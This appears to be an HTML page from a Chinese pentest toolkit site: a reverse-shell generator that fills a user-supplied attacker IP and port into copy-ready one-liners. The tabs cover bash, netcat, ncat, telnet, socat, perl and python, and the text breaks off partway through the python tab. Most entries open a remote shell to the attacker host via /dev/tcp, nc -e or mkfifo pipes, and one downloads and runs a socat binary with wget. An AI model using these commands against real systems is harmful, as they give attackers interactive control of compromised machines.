@@ -1,0 +1,1007 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>渗透平台 - C1O2A3</title>
+  <link rel="stylesheet" href="./src/css/layui.css">
+<style type="text/css">
+.layui-layout-admin .layui-body {
+    position: fixed;
+    top: 60px;
+    bottom: 44px;
+}
+.myselect {
+  outline-style: none;
+  border-bottom-color:  #ccc;
+  border-top: 0px;
+  border-left: 0px;
+  border-right: 0px;
+  padding-top: 16px;
+  overflow: hidden;
+  font-size: 15px;
+}
+.myinput{
+  width: 90%;
+  outline-style: none;
+  border-bottom-color:  #ccc;
+  border-top: 0px;
+  border-left: 0px;
+  border-right: 0px;
+  padding-top: 16px;
+  overflow: hidden;
+  font-size: 15px;
+  text-align: center;
+  resize: none;
+}
+.mymd5{
+  margin-top: 15px;
+  /*padding-top: 66px;*/
+}
+.myinput:hover {
+    border-bottom-color:  #c51152;
+    -webkit-box-shadow: 0 3px 0 0 #c51152;
+    box-shadow: 0 1px 0 0 #c51152;
+}
+.myinput:focus {
+    border-bottom-color:  #33ccff;
+    -webkit-box-shadow: 0 1px 0 0 #33ccff;
+    box-shadow: 0 1px 0 0 #33ccff;
+}
+.mypre{
+  border-bottom:1px solid #CFCFCF;
+}
+.mybg{
+  /*background-color:   #F7F7F7;*/
+  height: 300px;
+  padding: 1.25rem;
+  border-radius: 15px;
+  text-align:center;
+  margin:0 auto;
+  /*border:1px solid #000;*/
+  flex: 1 1 auto;
+  box-sizing: border-box;
+  width:80%;
+  box-shadow: 0 .5rem 1rem rgba(0,0,0,.15)!important;
+}
+.highlighted-parameter {
+    color: blue;
+    font-weight: bold;
+}
+.hiddentext {
+    position: fixed;
+    left: -100%;
+}
+</style>
+</head>
+<body class="layui-layout-body">
+<div class="layui-layout layui-layout-admin">
+  <div class="layui-header layui-bg-blue">
+    <div class="layui-logo"></div>
+
+    <!-- 头部区域（可配合layui已有的水平导航） -->
+    <ul class="layui-nav layui-layout-left">
+ <!--      <li class="layui-nav-item"><a href="">控制台</a></li>
+      <li class="layui-nav-item"><a href="">商品管理</a></li>
+      <li class="layui-nav-item"><a href="">用户</a></li> -->
+<!--       <li class="layui-nav-item">
+        <a href="javascript:;">其它系统</a>
+        <dl class="layui-nav-child">
+          <dd><a href="">邮件管理</a></dd>
+          <dd><a href="">消息管理</a></dd>
+          <dd><a href="">授权管理</a></dd>
+        </dl>
+      </li> -->
+    </ul>
+    <ul class="layui-nav layui-layout-right layui-bg-blue">
+      <li class="layui-nav-item">
+        <a href="javascript:;">
+          <img src="./src/img/test.jpg" class="layui-nav-img">
+          c1o2a3
+        </a>
+        <!-- <dl class="layui-nav-child"> -->
+<!--           <dd><a href="">基本资料</a></dd>
+          <dd><a href="">安全设置</a></dd> -->
+        <!-- </dl> -->
+      </li>
+      <!-- <li class="layui-nav-item"><a href="">退了</a></li> -->
+    </ul>
+  </div>
+  
+  <div class="layui-side layui-bg-blue">
+    <div class="layui-side-scroll">
+      <!-- 左侧导航区域（可配合layui已有的垂直导航） -->
+      <ul class="layui-nav layui-nav-tree layui-bg-blue"  lay-filter="test">
+        <li class="layui-nav-item">
+          <a class="" href="javascript:;">前端工具</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./decode.html">编码解码</a></dd>
+            <dd><a href="./qrcode.html">二维码生成</a></dd>
+            <!-- <dd><a href="./codebeautify.html">代码美化</a></dd> -->
+            <dd><a href="./passwd.html">随机密码生成器</a></dd>
+            <dd><a href="./idcard.html">身份证号码生成</a></dd>
+          </dl>
+        </li>
+        <li class="layui-nav-item layui-nav-itemed">
+          <a href="javascript:;">安全工具</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./googlehacking.html">google hacking</a></dd>
+            <dd><a href="./search.html">综合搜索</a></dd>
+            <dd><a href="./getAV.html">Windows杀软识别</a></dd>
+            <dd><a href="./tiquan.html">Windows提权辅助</a></dd>
+            <dd class="layui-this"><a href="./shell.html">反弹shell编码</a></dd>
+<!--             <dd><a href="">超链接</a></dd> -->
+          </dl>
+        </li>
+        <li class="layui-nav-item">
+          <a href="javascript:;">常用资料</a>
+          <dl class="layui-nav-child">
+            <dd><a href="./linux.html">Linux常用命令</a></dd>
+            <dd><a href="./windows.html">windows常用命令</a></dd>
+            <dd><a href="./powershell.html">powershell常用命令</a></dd>
+            <dd><a href="./down.html">传输方法常用命令</a></dd>
+<!--             <dd><a href="">超链接</a></dd> -->
+          </dl>
+        </li>
+<!--         <li class="layui-nav-item"><a href="">云市场</a></li>
+        <li class="layui-nav-item"><a href="">发布商品</a></li> -->
+      </ul>
+    </div>
+  </div>
+  
+  <div class="layui-body ">
+    <!-- 内容主体区域 -->
+    <div class="layui-collapse" lay-accordion="" style="padding: 15px; ">
+      <center>  <h1>反弹shell工具</h1></center>
+      <hr class="layui-border-blue">
+      <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+        <legend>IP/端口设置</legend>
+      </fieldset>
+<!-- 开始 -->
+<!-- IP端口设置 -->
+        <div class="layui-form-item" style="margin-top: 20px;">
+          <div class="layui-form-item" >
+            <div class="layui-inline">
+              <label class="layui-form-label"><span style="font-size: 20px;">IP:</span></label>
+              <div class="layui-input-inline">
+                <input type="text" name="ip" id="ip" lay-verify="required|ip"  autocomplete="off" class="myinput layui-input"  placeholder="192.168.1.1">
+              </div>
+            </div>
+            <div class="layui-inline">
+              <label class="layui-form-label"><span style="font-size: 20px;">port:</span></label>
+              <div class="layui-input-inline">
+                <input type="text" name="port" id="port"  autocomplete="off" style="width: 100px;" class="myinput layui-input" placeholder="4444">
+              </div>
+            </div>
+          </div>
+<!-- IP端口设置结束 -->
+<!-- 反弹监听端口开始 -->
+          <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+            <legend>Listener设置</legend>
+          </fieldset>
+            <div class="layui-inline">
+              <label class="layui-form-label"><span style="font-size: 20px;">listener:</span></label>
+              <div class="layui-input-inline">
+                <textarea type="text" name="prot" id="listener"  autocomplete="off" style="width: 150px;" class="myinput layui-input">nc - lvvp 4444</textarea>
+              </div>
+            </div>
+<!-- 反弹监听端口结束 -->
+<!-- shell列表 -->
+          <fieldset class="layui-elem-field layui-field-title" style="margin-top: 30px;">
+            <legend>反弹shell列表</legend>
+          </fieldset>
+          <div class="layui-form-item layui-form">
+            <label class="layui-form-label">选择shell</label>
+            <div class="layui-form">
+              <textarea id="txt" class="hiddentext"></textarea>
+              <div class="layui-input-block">
+                <input type="radio" name="shell" value="bash" title="bash" checked="" lay-filter="shell">
+                <input type="radio" name="shell" value="sh" title="sh" lay-filter="shell">
+                <input type="radio" name="shell" value="ash" title="ash" lay-filter="shell">
+                <input type="radio" name="shell" value="bsh" title="bsh" lay-filter="shell">
+                <input type="radio" name="shell" value="csh" title="csh" lay-filter="shell">
+                <input type="radio" name="shell" value="ksh" title="ksh" lay-filter="shell">
+                <input type="radio" name="shell" value="zsh" title="zsh" lay-filter="shell">
+                <input type="radio" name="shell" value="pdksh" title="pdksh" lay-filter="shell">
+                <input type="radio" name="shell" value="tcsh" title="tcsh" lay-filter="shell">
+              </div>
+            </div>
+
+          </div>
+                <div class="layui-tab layui-tab-card">
+                  <ul class="layui-tab-title">
+                    <li class="layui-this">Bash TCP</li>
+                    <li>Bash UDP</li>
+                    <li>Netcat</li>
+                    <li>Ncat</li>
+                    <li>Telnet</li>
+                    <li>Socat</li>
+                    <li>Perl</li>
+                    <li>Python</li>
+                    <li>PHP</li>
+                    <li>Ruby</li>
+                    <li>OpenSSL</li>
+                    <li>Powershell</li>
+                    <li>Awk</li>
+                    <li>TCLsh</li>
+                    <li>Java</li>
+                    <li>War</li>
+                    <li>Lua</li>
+                    <li>NodeJS</li>
+                    <li>Groovy</li>
+                    <li>Meterpreter Shell</li>
+                    <li>Xterm</li>
+                  </ul>
+                  <div class="layui-tab-content" >
+<!-- bash tcp 反弹shell开始 -->
+                    <div class="layui-tab-item layui-show">
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="bash001"><span class="radioshell" style="color:#F00;">bash</span> -i >& /dev/tcp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0>&1</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs bashcopy" onclick="copy('bash001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('bash001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="bash002">/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i > /dev/tcp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0<& 2>&1</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('bash001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('bash002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="bash003">exec 5&#x3c;&#x3e;/dev/tcp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>;cat &#x3c;&5 | while read line; do  2&#x3e;&5 &#x3e;&5; done</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('bash003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('bash003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="bash004">exec /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> 0&#x3c;/dev/tcp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 1&#x3e;&0 2&#x3e;&0</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('bash004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('bash004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="bash005">0&#x3c;&196;exec 196&#x3c;&#x3e;/dev/tcp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>; <span id="002" class="radioshell" style="color:#F00;">bash</span> &#x3c;&196 &#x3e;&196 2&#x3e;&196</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('bash005',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('bash005','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="bash006"><span id="002" class="radioshell" style="color:#F00;">bash</span> -c {echo,<span  id="base64bash" class="base64bash" style="color:#F00;">YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjE5Mi4xLzgwODAgMD4mMQ==</span>}|{base64,-d}|{<span id="002" class="radioshell" style="color:#F00;">bash</span>,-i}</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('bash006',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('bash006','enurl');">URL编码</button>
+                        </div>
+                      </div>
+<!-- bash tcp反弹shell结束 -->
+                    </div>
+<!-- bash udp反弹shell开始 -->
+                    <div class="layui-tab-item">
+                      <blockquote class="layui-elem-quote">受害者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="udp001"><span id="002" class="radioshell" style="color:#F00;">bash</span> -i >& /dev/udp/<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>/<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0>&1</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('udp001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('udp001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">攻击者</blockquote>
+                        <pre lay-title="Bash TCP:" lay-encode="true" id="udp002">nc -u -lvp <span id="bash1port" class="bash1port" style="color:#F00;">4444</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('udp002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('udp002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- bash udp反弹shell结束 -->
+<!-- netcat反弹shell开始 -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat001">nc -e /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat002">nc -c <span id="002" class="radioshell" style="color:#F00;">bash</span> <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat003">mknod backpipe p && nc <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0&#x3c;backpipe | /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> 1&#x3e;backpipe </pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat004">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i 2&#x3e;&1|nc <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> &#x3e;/tmp/f</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat005">rm -f /tmp/p; mknod /tmp/p p && nc <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0/tmp/p 2>&1</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat005',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat005','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat006">rm f;mkfifo f;cat f|/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i 2&#x3e;&1|nc <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> &#x3e; f</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat006',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat006','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="netcat" lay-encode="true" id="netcat007">rm -f x; mknod x p && nc <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0&#x3c;x | /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> 1&#x3e;x</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('netcat007',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('netcat007','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- netcat反弹shell结束 -->
+<!-- ncat反弹shell -->
+                    <div class="layui-tab-item">
+                      <blockquote class="layui-elem-quote">受害者</blockquote>
+                      <!-- <hr class="layui-border-blue"> -->
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="ncat001">ncat <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -e /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('ncat001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('ncat001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">攻击者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="ncat001">ncat --udp <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> -e /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('ncat001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('ncat001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- ncat反弹shell -->
+<!-- telnet反弹shell -->
+                    <div class="layui-tab-item">
+                      <div class="layui-field-box">
+                        <pre lay-title="telnet" lay-encode="true" id="telnet001">rm -f /tmp/p; mknod /tmp/p p && telnet <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0/tmp/p 2>&1</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('telnet001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('telnet001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="telnet" lay-encode="true" id="telnet002">telnet <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> | /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> | telnet <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> 444</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('telnet002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('telnet002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="telnet" lay-encode="true" id="telnet003">rm f;mkfifo f;cat f|/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> -i 2>&1|telnet <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> &#x3e; f</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('telnet003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('telnet003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="telnet" lay-encode="true" id="telnet004">rm -f x; mknod x p && telnet <span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span> <span id="bash1port" class="bash1port" style="color:#F00;">4444</span> 0&#x3c;x | /bin/<span id="002" class="radioshell" style="color:#F00;">bash</span> 1&#x3e;x</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('telnet004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('telnet004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- telnet反弹shell -->
+<!-- socat反弹shell -->
+                    <div class="layui-tab-item">
+                      <blockquote class="layui-elem-quote">受害者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="telnet" lay-encode="true" id="socat001">/tmp/socat exec:'<span id="002" class="radioshell" style="color:#F00;">bash</span> -li',pty,stderr,setsid,sigint,sane tcp:<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:<span id="bash1port" class="bash1port" style="color:#F00;">4444</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('socat001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('socat001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="telnet" lay-encode="true" id="socat002">socat tcp-connect:<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:<span id="bash1port" class="bash1port" style="color:#F00;">4444</span> exec:"<span id="002" class="radioshell" style="color:#F00;">bash</span> -li",pty,stderr,setsid,sigint,sane</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('socat002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('socat002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">攻击者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="socat003">socat file:`tty`,raw,echo=0 TCP-L:<span id="bash1port" class="bash1port" style="color:#F00;">4444</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('socat003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('socat003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">受害者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="socat004">wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'<span id="002" class="radioshell" style="color:#F00;">bash</span> -li',pty,stderr,setsid,sigint,sane tcp:<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:<span id="bash1port" class="bash1port" style="color:#F00;">4444</span></pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('socat004',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('socat004','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- socat反弹shell -->
+<!-- perl反弹shell -->
+                    <div class="layui-tab-item">
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">受害者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="perl001">perl -e 'use Socket;$i="<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>";$p=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,"&#x3e;&S");open(STDOUT,"&#x3e;&S");open(STDERR,">&S");exec("/bin/sh -i");};'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('perl001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('perl001','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="perl002">perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,"<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>");STDIN->fdopen($c,r);$~-&#x3e;fdopen($c,w);system$_ while&#x3c;&#x3e;;'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('perl002',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('perl002','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">仅windows 攻击者</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="perl003">perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"<span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>:<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>");STDIN-&#x3e;fdopen($c,r);$~->fdopen($c,w);system$_ while&#x3c;&#x3e;;'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('perl003',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('perl003','enurl');">URL编码</button>
+                        </div>
+                      </div>
+                    </div>
+<!-- perl反弹shell -->
+<!-- python反弹shell -->
+                    <div class="layui-tab-item">
+                      <hr class="layui-border-blue">
+                      <blockquote class="layui-elem-quote">IP V4</blockquote>
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="python001">python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>",<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>","-i"]);'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
+                          <button type="button" class="layui-btn layui-btn-xs" onclick="copy('python001',null);" >复&nbsp;&nbsp;制</button>
+                          <button type="button" class="layui-btn layui-btn-normal layui-btn-xs" onclick="copy('python001','enurl');">URL编码</button>
+                        </div>
+                      </div>    
+                      <div class="layui-field-box">
+                        <pre lay-title="ncat" lay-encode="true" id="python002">export RHOST="span id="bash1ip" class="bash1ip" style="color:#F00;">192.168.1.1</span>";export RPORT=<span id="bash1port" class="bash1port" style="color:#F00;">4444</span>;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/<span id="002" class="radioshell" style="color:#F00;">bash</span>")'</pre>
+                        <div class="layui-btn-container" style="margin-top: 15px;">
